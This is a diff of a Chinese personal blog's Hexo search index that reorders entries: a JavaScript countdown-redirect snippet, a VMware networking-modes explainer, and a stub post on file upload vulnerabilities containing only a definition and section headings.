class="property">href</span> = <span class="string">"https://blog.anineg.space/"</span>; <span class="comment">// 跳转到下一个页面</span></span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">    }, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">clearInterval</span>(intervalId); <span class="comment">// 清除计时器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"countdown-text"</span>).<span class="property">innerHTML</span> = <span class="string">"欢迎访问ANINEG的小屋"</span>; <span class="comment">// 替换倒计时提示为“欢迎访问”</span></span></span><br><span class="line"><span class="language-javascript">    });</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"countdown-text"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"countdown"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 秒后自动前往博客页···<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>实际上，该模板的入场动画大概耗费3秒左右，因此需要10秒自动跳转的效果就需要将预设调为13秒。</p>
+<p>在预加载部分，在倒计时开始时，使用JavaScript动态创建一个<code>&lt;iframe&gt;</code>元素，并将需要预加载的页面设置为该<code>&lt;iframe&gt;</code>的<code>src</code>属性。这样，浏览器就会在倒计时期间开始预加载该页面，从而提高用户体验。</p>
+<p>接着，我们创建了一个计时器，每秒减少计数器变量<code>count</code>的值，并更新页面上的倒计时数字。当<code>count</code>的值减少到0时，清除计时器并跳转到下一个页面。最后，在页面上添加了一个事件监听器，当用户单击页面上的任何位置时，清除计时器，停止倒计时。</p>
+<p>最后，我们在页面中添加了一个<code>&lt;p&gt;</code>元素，并将其<code>id</code>属性设置为<code>"countdown-text"</code>，用于显示倒计时提示或替换后的新文本。在计时器停止时，我们使用JavaScript修改了该元素的文本内容，将倒计时提示替换为需要显示的新文本。同时在单击事件监听器中补充添加了一行代码，用于在停止计时器时替换倒计时提示为“欢迎访问”文本。这样，无论是计时器正常结束还是被单击事件停止，都会显示“欢迎访问”文本。</p>
 ]]></content>
       <categories>
-        <category>学习笔记</category>
+        <category>随手记</category>
       </categories>
+      <tags>
+        <tag>源码</tag>
+      </tags>
   </entry>
   <entry>
     <title>Python网络爬虫之微信公众号（待改进）</title>
@@ -1343,23 +1343,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
-    <title>文件上传漏洞</title>
-    <url>/2022/03/25/upload/</url>
-    <content><![CDATA[<h1>什么是文件上传漏洞</h1>
-<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
-<h1>前端JS过滤绕过</h1>
-<h1>文件名过滤绕过</h1>
-<h1>Content-Type过滤绕过</h1>
-<h1>文件头过滤绕过</h1>
-<h1>.htaccess文件上传</h1>
-<h1>文件截断上传</h1>
-<h1>竞争条件文件上传</h1>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>使用Vercel+Github搭建个人博客</title>
     <url>/2022/02/15/vercel/</url>
     <content><![CDATA[<h1>前言</h1>
@@ -1401,40 +1384,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
-    <title>桥接模式、NAT模式和仅主机模式</title>
-    <url>/2022/10/05/vmnet/</url>
-    <content><![CDATA[<h1>虚拟机网络</h1>
-<p>在VMware中，虚拟机的网络连接主要是由VMware创建的虚拟交换机(也叫做虚拟网络)负责实现的，VMware可以根据需要创建多个虚拟网络。</p>
-<p>在Windows系统的主机上，VMware最多可以创建20个虚拟网络，每个虚拟网络可以连接任意数量的虚拟机网络设备；在Linux系统的主机上，VMware最多可以创建255个虚拟网络，但每个虚拟网络仅能连接32个虚拟机网络设备。VMware的虚拟网络都是以"VMnet+数字"的形式来命名的，例如 VMnet0、VMnet1、VMnet2……以此类推(在Linux系统的主机上，虚拟网络的名称均采用小写形式，例如 vmnet0 )。</p>
-<p>当我们安装VMware时，VMware会自动为3种网络连接模式各自创建1个虚拟机网络（如下图）：VMnet0(桥接模式)、VMnet8(NAT模式)、VMnet1(仅主机模式)。此外，我们也可以根据需要自行创建更多的虚拟网络。</p>
-<p><img src="https://img.anineg.space/image-20221005153913571.png" alt="image-20221005153913571"></p>
-<h1>桥接模式</h1>
-<p>VMware桥接模式，也就是将虚拟机的虚拟网络适配器与主机的物理网络适配器进行交接，虚拟机中的虚拟网络适配器可通过主机中的物理网络适配器直接访问到外部网络。简而言之，这就好像在局域网中添加了一台新的、独立的计算机一样。因此，虚拟机也会占用局域网中的一个IP地址，并且可以和其他终端进行相互访问。</p>
-<p>桥接模式网络连接支持有线和无线主机网络适配器。如果你想把虚拟机当做一台完全独立的计算机看待，并且允许它和其他终端一样的进行网络通信，那么桥接模式通常是虚拟机访问网络的最简单途径。</p>
-<h2 id="示例">示例</h2>
-<p><img src="https://img.anineg.space/image-20221005170013772.png" alt="image-20221005170013772"></p>
-<h1>NAT模式</h1>
-<p>NAT，是Network Address Translation的缩写，意即网络地址转换。NAT模式也是VMware创建虚拟机的默认网络连接模式。使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。虚拟机向外部网络发送的请求数据"包裹"，都会交由NAT网络适配器加上"特殊标记"并以主机的名义转发出去，外部网络返回的响应数据"包裹"，也是先由主机接收，然后交由NAT网络适配器根据"特殊标记"进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。</p>
-<p>此外，在一台主机上只允许有一个NAT模式的虚拟网络。因此，同一台主机上的多个采用NAT模式网络连接的虚拟机也是可以相互访问的。</p>
-<h2 id="示例-v2">示例</h2>
-<p><img src="https://img.anineg.space/image-20221005170142024.png" alt="image-20221005170142024"></p>
-<h1>仅主机模式</h1>
-<p>仅主机模式，是一种比NAT模式更加封闭的的网络连接模式，它将创建完全包含在主机中的专用网络。仅主机模式的虚拟网络适配器仅对主机可见，并在虚拟机和主机系统之间提供网络连接。相对于NAT模式而言，仅主机模式不具备NAT功能，因此在默认情况下，使用仅主机模式网络连接的虚拟机无法连接到Internet(在主机上安装合适的路由或代理软件，或者在Windows系统的主机上使用Internet连接共享功能，仍然可以让虚拟机连接到Internet或其他网络)。</p>
-<p>在同一台主机上可以创建多个仅主机模式的虚拟网络，如果多个虚拟机处于同一个仅主机模式网络中，那么它们之间是可以相互通信的；如果它们处于不同的仅主机模式网络，则默认情况下无法进行相互通信(可通过在它们之间设置路由器来实现相互通信)。</p>
-<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
-              <div class="content">
-              <div class="tag link"><a class="link-card" title="桥接模式、NAT模式和仅主机模式" href="https://blog.csdn.net/swadian2008/article/details/109518783"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">桥接模式、NAT模式和仅主机模式</p><p class="url">https://blog.csdn.net/swadian2008/article/details/109518783</p></div></a></div>
-              </div>
-            </details>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>虚拟机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>《拒绝校园贷》——大学生心理微电影</title>
     <url>/2022/05/01/weidianying/</url>
     <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
@@ -1469,6 +1418,40 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       <categories>
         <category>随手记</category>
       </categories>
+  </entry>
+  <entry>
+    <title>桥接模式、NAT模式和仅主机模式</title>
+    <url>/2022/10/05/vmnet/</url>
+    <content><![CDATA[<h1>虚拟机网络</h1>
+<p>在VMware中，虚拟机的网络连接主要是由VMware创建的虚拟交换机(也叫做虚拟网络)负责实现的，VMware可以根据需要创建多个虚拟网络。</p>
+<p>在Windows系统的主机上，VMware最多可以创建20个虚拟网络，每个虚拟网络可以连接任意数量的虚拟机网络设备；在Linux系统的主机上，VMware最多可以创建255个虚拟网络，但每个虚拟网络仅能连接32个虚拟机网络设备。VMware的虚拟网络都是以"VMnet+数字"的形式来命名的，例如 VMnet0、VMnet1、VMnet2……以此类推(在Linux系统的主机上，虚拟网络的名称均采用小写形式，例如 vmnet0 )。</p>
+<p>当我们安装VMware时，VMware会自动为3种网络连接模式各自创建1个虚拟机网络（如下图）：VMnet0(桥接模式)、VMnet8(NAT模式)、VMnet1(仅主机模式)。此外，我们也可以根据需要自行创建更多的虚拟网络。</p>
+<p><img src="https://img.anineg.space/image-20221005153913571.png" alt="image-20221005153913571"></p>
+<h1>桥接模式</h1>
+<p>VMware桥接模式，也就是将虚拟机的虚拟网络适配器与主机的物理网络适配器进行交接，虚拟机中的虚拟网络适配器可通过主机中的物理网络适配器直接访问到外部网络。简而言之，这就好像在局域网中添加了一台新的、独立的计算机一样。因此，虚拟机也会占用局域网中的一个IP地址，并且可以和其他终端进行相互访问。</p>
+<p>桥接模式网络连接支持有线和无线主机网络适配器。如果你想把虚拟机当做一台完全独立的计算机看待，并且允许它和其他终端一样的进行网络通信，那么桥接模式通常是虚拟机访问网络的最简单途径。</p>
+<h2 id="示例">示例</h2>
+<p><img src="https://img.anineg.space/image-20221005170013772.png" alt="image-20221005170013772"></p>
+<h1>NAT模式</h1>
+<p>NAT，是Network Address Translation的缩写，意即网络地址转换。NAT模式也是VMware创建虚拟机的默认网络连接模式。使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。虚拟机向外部网络发送的请求数据"包裹"，都会交由NAT网络适配器加上"特殊标记"并以主机的名义转发出去，外部网络返回的响应数据"包裹"，也是先由主机接收，然后交由NAT网络适配器根据"特殊标记"进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。</p>
+<p>此外，在一台主机上只允许有一个NAT模式的虚拟网络。因此，同一台主机上的多个采用NAT模式网络连接的虚拟机也是可以相互访问的。</p>
+<h2 id="示例-v2">示例</h2>
+<p><img src="https://img.anineg.space/image-20221005170142024.png" alt="image-20221005170142024"></p>
+<h1>仅主机模式</h1>
+<p>仅主机模式，是一种比NAT模式更加封闭的的网络连接模式，它将创建完全包含在主机中的专用网络。仅主机模式的虚拟网络适配器仅对主机可见，并在虚拟机和主机系统之间提供网络连接。相对于NAT模式而言，仅主机模式不具备NAT功能，因此在默认情况下，使用仅主机模式网络连接的虚拟机无法连接到Internet(在主机上安装合适的路由或代理软件，或者在Windows系统的主机上使用Internet连接共享功能，仍然可以让虚拟机连接到Internet或其他网络)。</p>
+<p>在同一台主机上可以创建多个仅主机模式的虚拟网络，如果多个虚拟机处于同一个仅主机模式网络中，那么它们之间是可以相互通信的；如果它们处于不同的仅主机模式网络，则默认情况下无法进行相互通信(可通过在它们之间设置路由器来实现相互通信)。</p>
+<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
+              <div class="content">
+              <div class="tag link"><a class="link-card" title="桥接模式、NAT模式和仅主机模式" href="https://blog.csdn.net/swadian2008/article/details/109518783"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">桥接模式、NAT模式和仅主机模式</p><p class="url">https://blog.csdn.net/swadian2008/article/details/109518783</p></div></a></div>
+              </div>
+            </details>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>虚拟机</tag>
+      </tags>
   </entry>
   <entry>
     <title>CTF隐写术(图片隐写)</title>
@@ -3809,5 +3792,22 @@ PNG图片文件结构：</p>
       <tags>
         <tag>隐写</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞</title>
+    <url>/2022/03/25/upload/</url>
+    <content><![CDATA[<h1>什么是文件上传漏洞</h1>
+<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
+<h1>前端JS过滤绕过</h1>
+<h1>文件名过滤绕过</h1>
+<h1>Content-Type过滤绕过</h1>
+<h1>文件头过滤绕过</h1>
+<h1>.htaccess文件上传</h1>
+<h1>文件截断上传</h1>
+<h1>竞争条件文件上传</h1>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
   </entry>
 </search>
